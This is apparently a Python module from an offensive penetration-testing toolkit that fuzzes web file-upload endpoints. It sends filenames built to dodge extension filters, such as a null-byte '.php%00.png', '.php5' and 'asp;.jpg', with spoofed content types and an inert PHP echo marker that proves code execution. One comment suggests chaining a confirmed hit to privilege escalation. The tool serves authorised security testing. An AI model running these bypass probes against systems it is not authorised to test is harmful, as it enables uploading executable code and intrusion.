"""omega/offensive/offense/uploadfuzz — file upload bypass engine.

Probe upload endpoints for filter bypasses: extension tricks
(.php5, double extension, null-byte shape), content-type tampering,
polyglot-ish content (inert markers only — never a working webshell;
a bounce-back marker proves EXECUTION path without shipping a real
shell). OFFENSE-GATED (PTK_OFFENSE). Candidate-grade.
"""
import os

__all__ = ["run_uploadfuzz"]

# name variants x content markers; content is ALWAYS an inert text
# marker — if the server executes it and echoes the marker back,
# execution is proven without shipping a functional payload.
CASES = [
    ("shell.php.txt", "text/plain"),
    ("shell.php5", "application/x-php"),
    ("shell.php%00.png", "image/png"),
    ("shell.pHp", "image/jpeg"),
    ("shell.php.jpeg", "image/jpeg"),
    ("shell.svg", "image/svg+xml"),
    ("shell.asp;.jpg", "image/jpeg"),
]
MARKER_BODY = "omeguploadmarker-{token}\n<?php echo 'omeguploadmarker-{token}'; ?>\n"


def run_uploadfuzz(target, upload_field="file", fetch=None,
                   extra_fields=None, log=None, gate_open_fn=None):
    """Probe an upload endpoint with name/content-type variants.

    fetch(url, method="POST", body=bytes, headers={...}) is expected
    to be a multipart-capable adapter (omega fetchers pass raw body
    through). Results are candidate; execution verdicts require the
    operator to visit the uploaded path.
    """
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(fetch):
        return {"note": "multipart fetch adapter required"}
    import secrets
    token = secrets.token_hex(6)
    findings = []
    accepted = []
    for name, ctype in CASES:
        body = MARKER_BODY.format(token=token).encode()
        boundary = "omegboundary" + token
        mp = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{upload_field}"; '
            f'filename="{name}"\r\n'
            f"Content-Type: {ctype}\r\n\r\n").encode() + body + \
            f"\r\n--{boundary}--\r\n".encode()
        headers = {"Content-Type": f"multipart/form-data; "
                                   f"boundary={boundary}"}
        for k, v in (extra_fields or {}).items():
            mp += (f"--{boundary}\r\n"
                   f'Content-Disposition: form-data; name="{k}"'
                   f"\r\n\r\n{v}\r\n").encode()
            mp += f"--{boundary}--\r\n".encode()
        try:
            resp = fetch(str(target), method="POST", body=mp,
                         headers=headers)
        except TypeError:
            resp = fetch(str(target), method="POST", body=mp)
        except Exception:
            continue
        st = getattr(resp, "status", 0)
        text = (resp if isinstance(resp, str) else
                getattr(resp, "text", "") or "")
        if st and 200 <= st < 300 and "error" not in text.lower()[:200]:
            accepted.append({"name": name, "status": st,
                             "response": text[:200]})
    if accepted:
        findings.append({
            "title": f"upload bypass candidates: {len(accepted)} "
                     f"executable-looking variants accepted",
            "severity": "HIGH",
            "source": "uploadfuzz/extension-bypass",
            "evidence": "; ".join(
                f"{a['name']} -> HTTP {a['status']}"
                for a in accepted[:6]),
            "location": str(target),
            "verification": "candidate",
            "manual_check": f"visit the uploaded paths and confirm "
                            f"whether marker {token} is EXECUTED "
                            f"(echoed) or served raw; if executed, "
                            f"chain to privesc",
            "cwe": "CWE-434",
        })
    if log:
        log(f"uploadfuzz: accepted={len(accepted)}/{len(CASES)}")
    return {"findings": findings, "accepted": accepted, "token": token}
